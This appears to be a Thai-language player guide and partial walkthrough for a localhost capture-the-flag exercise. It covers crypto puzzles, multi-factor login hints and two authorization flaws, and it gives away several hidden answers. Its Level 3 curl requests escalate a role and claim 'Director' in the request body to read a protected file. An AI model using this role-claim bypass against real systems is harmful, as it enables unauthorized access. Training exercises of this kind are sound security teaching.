# MUT Secure Vault - คู่มือผู้เล่น

ยินดีต้อนรับ Agent! คู่มือนี้จะช่วยนำทางคุณผ่านด่าน CTF ของ MUT Secure Vault

## เริ่มต้นใช้งาน

### สำหรับ UI (Frontend)
1. ไปที่ http://localhost:5173
2. ลงทะเบียนและเข้าสู่ระบบ
3. คลิก "เริ่มเกม"

### สำหรับ API (Backend)
```bash
# 1. ลงทะเบียน
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"your_username","email":"your@email.com","password":"YourPassword123!"}'

# 2. เข้าสู่ระบบ (เก็บ token ไว้)
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"your_username","password":"YourPassword123!"}'

# 3. เริ่มเกม (ใช้ token จากขั้นตอนที่ 2)
curl -X POST http://localhost:3001/api/game/start \
  -H "Authorization: Bearer $TOKEN"
# จะได้ token ใหม่ที่มี sessionId - ใช้ token นี้ต่อไป
```

---

## ด่าน 1: Cryptography

### ภาพรวม
ด่านนี้จะทดสอบความรู้เรื่อง:
- Diffie-Hellman Key Exchange
- Caesar Cipher
- AES-256-CBC Encryption
- SHA-256 Hashing

### ขั้นตอนการทำ

#### 1. ดาวน์โหลด Artifacts
```bash
curl http://localhost:3001/api/c1/artifacts -H "Authorization: Bearer $TOKEN"
```

จะได้ข้อมูล:
- Diffie-Hellman parameters (prime, generator)
- AES IV
- RSA public key
- Salt cipher (รหัสลับที่ต้องถอด)

#### 2. Diffie-Hellman Key Exchange
```python
import random

# ค่าจาก artifacts
p = int(artifacts['diffieHellman']['prime'], 16)
g = int(artifacts['diffieHellman']['generator'], 16)

# สร้าง client private key
a = random.getrandbits(256)

# คำนวณ client public key: A = g^a mod p
A = pow(g, a, p)

# ส่งไป server
# POST /api/c1/dh/exchange กับ {"clientPublicKey": hex(A)[2:]}

# รับ server public key (B) แล้วคำนวณ shared secret
shared_secret = pow(B, a, p)
```

#### 3. ถอดรหัส Caesar Cipher เพื่อหา Salt
- ดู salt cipher จาก artifacts (เช่น "jlirerivv")
- ใช้ Caesar cipher decoder
- ลองหา shift ที่ถูกต้อง (คำตอบควรเป็นคำที่มีความหมาย)

```python
def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base - shift) % 26 + base)
        else:
            result += char
    return result

# ลอง shift ต่างๆ จนได้คำที่มีความหมาย
cipher_text = "jlirerivv"
for shift in range(26):
    print(f"Shift {shift}: {caesar_decrypt(cipher_text, shift)}")
```

#### 4. สร้าง AES Key
```python
import hashlib

# ใช้ salt ที่ได้จากการถอด Caesar cipher
key_data = hex(shared_secret)[2:] + salt
aes_key = hashlib.sha256(key_data.encode()).digest()
```

#### 5. ถอดรหัส AES-256-CBC
```python
from Crypto.Cipher import AES

# GET /api/c1/encrypted
iv = bytes.fromhex(artifacts['aes']['iv'])
encrypted_data = bytes.fromhex(encrypted_response['encrypted']['data'])

cipher = AES.new(aes_key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted_data)
message = decrypted[:-decrypted[-1]].decode()  # ลบ PKCS7 padding
```

**คำใบ้:** ถ้าข้อความที่ถอดรหัสอ่านได้ (ไม่ใช่ตัวอักษรมั่ว) แสดงว่า salt ถูกต้อง

#### 6. ดึง Signature
```bash
curl http://localhost:3001/api/c1/signature -H "Authorization: Bearer $TOKEN"
```

#### 7. สร้าง FLAG_1

**สูตร:** `FLAG_1 = MUT{SHA256(decrypted_message + "????????" + signature)[:32]}`

```python
import hashlib

# ???????? = ค่าลับที่ต้องหา (เกี่ยวกับวันสำคัญของ มทส.)
flag_data = message + "????????" + signature_hex
flag_hash = hashlib.sha256(flag_data.encode()).hexdigest()[:32]
FLAG_1 = f"MUT{{{flag_hash}}}"
```

**คำใบ้:** ค่า "????????" เกี่ยวข้องกับวันก่อตั้ง มทส. ในรูปแบบ วันเดือนปี พ.ศ.

---

### ส่งคำตอบ
```bash
curl -X POST http://localhost:3001/api/c1/submit-flag \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag": "MUT{your_flag_here}"}'
```

---

## ด่าน 2: Authentication (3 ปัจจัย)

### คำใบ้
| ปัจจัย | คำใบ้ |
|--------|--------|
| **Email OTP** | กรอกอีเมลจริง → จะได้ OTP และคำใบ้ทางอีเมล |
| **รหัสผ่าน** | ดูคำใบ้แบบสลับตัวอักษรในอีเมล |
| **PIN** | ดูซองจดหมายในอีเมล - รหัสไปรษณีย์คืออะไร? |

### วิธีทำ

```bash
# ปัจจัยที่ 1: Email OTP
# ส่ง OTP
curl -X POST http://localhost:3001/api/c2/email/send-otp \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com"}'
# จะได้ demoOTP ในการตอบกลับ

# ยืนยัน OTP (ใช้ค่า demoOTP ที่ได้)
curl -X POST http://localhost:3001/api/c2/email/verify-otp \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"otp": "123456"}'

# ปัจจัยที่ 2: รหัสผ่าน (ดูคำใบ้ในอีเมล แล้วเรียงตัวอักษรให้ถูกต้อง)
curl -X POST http://localhost:3001/api/c2/password \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password": "YOUR_UNSCRAMBLED_PASSWORD"}'

# ปัจจัยที่ 3: PIN (ดูซองจดหมายในอีเมล - รหัสไปรษณีย์คืออะไร?)
curl -X POST http://localhost:3001/api/c2/pin \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"pin": "YOUR_POSTAL_CODE"}'

# รับ FLAG_2
curl http://localhost:3001/api/c2/mfa/status \
  -H "Authorization: Bearer $SESSION_TOKEN"

# ส่ง FLAG_2 (หรือใช้ช่องกรอกใน UI)
curl -X POST http://localhost:3001/api/c2/submit-flag \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag": "MUT{...}"}'
```

### คำใบ้เพิ่มเติม
- **รหัสผ่าน:** ตัวอักษรถูกสลับที่ ลองจัดเรียงใหม่ให้เป็นคำที่มีความหมาย (เกี่ยวกับสาขาวิชา)
- **PIN:** มทส. อยู่ที่จังหวัดนครราชสีมา รหัสไปรษณีย์คืออะไร?

---

## ด่าน 3: Authorization (2 ช่องโหว่)

### ขั้นตอนที่ 1: อัพเกรดบทบาท
```bash
curl -X POST http://localhost:3001/api/c3/request-access \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"resource": "any", "reason": "any"}'
```
ผลลัพธ์: บทบาทเปลี่ยนจาก Student → Researcher

### ขั้นตอนที่ 2: เข้าถึงไฟล์ลับที่สุด
```bash
curl -X POST http://localhost:3001/api/c3/declassify \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "resource": "FINAL_FLAG.txt",
    "requester_role": "Director",
    "reason": "any"
  }'
```

### ขั้นตอนที่ 3: รับและส่ง Flag
```bash
# รับ flag
curl http://localhost:3001/api/c3/final-flag \
  -H "Authorization: Bearer $TOKEN"

# ส่ง flag
curl -X POST http://localhost:3001/api/c3/submit-flag \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag": "MUT{...}"}'
```

---

## สรุปข้อมูลสำคัญ

| ข้อมูล | คำใบ้ |
|--------|-----|
| วันก่อตั้ง มทส. | 27 กรกฎาคม 2533 |
| รหัสไปรษณีย์นครราชสีมา | 30000 |
| รหัสผ่าน | ดูคำใบ้ในอีเมล (ตัวอักษรสลับ) |
| PIN | ดูซองจดหมายในอีเมล |
| Salt | ถอดรหัส Caesar cipher |

---

## เคล็ดลับ

1. **อ่านคำใบ้ใน API** - ทุก endpoint มีคำใบ้ชัดเจน
2. **ใช้ curl หรือ Postman** - ง่ายกว่าเขียนโค้ดเอง
3. **ถ้า AES decrypt ออกมาเป็นตัวอักษรมั่ว** - แสดงว่า salt ผิด ลองใหม่
4. **สังเกตข้อมูลในอีเมล** - มีคำใบ้สำหรับ password และ PIN

ขอให้โชคดี!
